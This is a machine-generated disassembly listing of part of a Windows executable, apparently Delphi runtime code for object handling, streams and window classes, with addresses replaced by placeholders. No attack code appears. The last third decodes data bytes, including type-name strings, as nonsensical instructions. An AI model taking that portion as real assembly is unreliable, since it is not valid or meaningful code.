jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a4cc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41a4f0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c8
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_41a538
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
mov edx esi
call sub_41a768
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_41a5a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41a768
mov edx ebx
mov eax esi
call sub_41a75c
sub_41a5e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419cdc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_41a628
push ebx
push esi
push edi
call sub_40346c
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419d28
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_419fdc
jmp r-xdata
mov eax esi
call sub_413adc
mov edx eax
mov eax edi
call sub_41a768
lea eax [ edi + 0x50 ]
call sub_40cc80
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403454
sub_41a688
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419ff8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_41a6b4
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_41a6d0
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_41a6ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_4139f4
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_41a768
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4138e4
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4139f4
cmp ebp eax
jne r-xdata
sub_41a7a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_419fdc
mov edx ebx
call sub_419dac
sub_41a7d4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c8
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_41a81c
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_4030f8
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_41a854
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41a8a3
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a8bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41a90b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a924
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a98e
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41a9a8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a9f1
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_415af8
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41aa0c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405564
xor eax eax
push ebp
push sub_41abf9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41abd2
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026cc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41abc1
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026ec
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403918
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac00
lea eax [ ebp + 0xc ]
call sub_4054f0
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403918
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41ac3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41ac9f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41acd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_413df4
mov edi eax
xor eax eax
push ebp
push sub_41ad25
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad2c
mov eax [ rw-data ]
call sub_413e58
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4139f4
call sub_4030f8
inc esi
dec ebx
jne r-xdata
sub_41ad44
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41ad6c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028c8
mov edx sub_41ad44
lea eax [ esi + 0x5 ]
call sub_41ad64
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41ad64
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41ae28
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_4067dc
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ad6c
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41aedc
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41ae04
sub_41af04
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41afa8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41afaf
retn
mov eax [ rw-data ]
call sub_4131e4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41acd0
xor edx edx
xor eax eax
call sub_4169f8
mov eax rw-data
call sub_40cc80
call sub_405c20
lea eax [ eax + 0xc ]
call sub_40cc80
mov eax rw-data
call sub_40cc80
mov eax rw-data
call sub_4054f0
mov eax sub_41ad3c
call sub_40538c
mov eax rw-data
call sub_40cc80
call sub_4195f4
mov eax rw-data
call sub_40cc80
mov eax rw-data
call sub_4054f0
sub_41afb4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41b03d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b044
retn
call sub_4195c0
mov eax sub_41ad3c
call sub_405384
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c9c0
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_405508
mov dl 0x1
mov eax [ r-xdata ]
call sub_412ae0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413c9c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413c9c
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41b048
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ebx + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + edi * 8 - 0x599c0000 ] cl
inc esi
add [ ebp + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc esi
add [ esi + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc esi
add [ eax - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ecx - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edx - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ebx - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi + edi * 8 ] dh
add [ esi + 0x46 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ esi - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ eax - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ecx - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edx - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ebx - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi + edi * 8 ] bh
add [ esi + 0x46 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ esi - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ eax - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ecx - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edx - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ebx - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi + edi * 8 ] ah
add [ esi + 0x46 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ esi - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ eax - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ecx - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edx - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ebx - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi + edi * 8 ] ch
add [ esi + 0x46 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ esi - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ eax - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ecx - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edx - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ebx - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi + edi * 8 ] dl
add [ esi + 0x46 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ esi - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ eax - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ecx - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edx - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ebx - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi + edi * 8 ] bl
add [ esi + 0x46 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ esi - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ eax - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ecx - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edx - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ebx - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi + edi * 8 ] al
add [ esi + 0x46 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ esi - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ eax - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ecx - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edx - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ebx - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi + edi * 8 ] cl
add [ esi + 0x46 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ esi - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ eax ] dh
inc [ eax ]
add [ esi + 0x46 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + 0x46 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ esi ] dh
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edi ] dh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41b2d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b2dc
retn
sub_41b2e8
in al dx
mov dl 0x41
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
dec esp
mov bl 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 4 + 0x41 ] cl
add [ eax + eax ] cl
add [ eax ] al
adc al 0x6d
inc eax
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0xf41f37d
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax + 0x41b3 ] bp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0041b3 ] ch
add [ eax ] al
add [ ebp * 2 + 0x33280040 ] dl
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x1841f3d9
inc ebp
dec ecx
outsb
jbe r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
enter 0x41b3 0x0
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
jae r-xdata
inc esi
popad
insd
nop
sbb al 0xb4
inc ecx
add [ ecx ] al
or al 0x54
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
cmp [ ecx + eax * 2 + 0x540a0300 ] dh
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add ah al
mov bl 0x41
add [ ecx ] cl
jo r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ esi * 4 + 0x70070041 ] al
insd
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
mov ah 0x41
add [ ebx + 0x41b4a0c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
xor al 0xb4
inc ecx
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esp + esi * 4 ] dh
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
insd
push edi
push 0x5657469
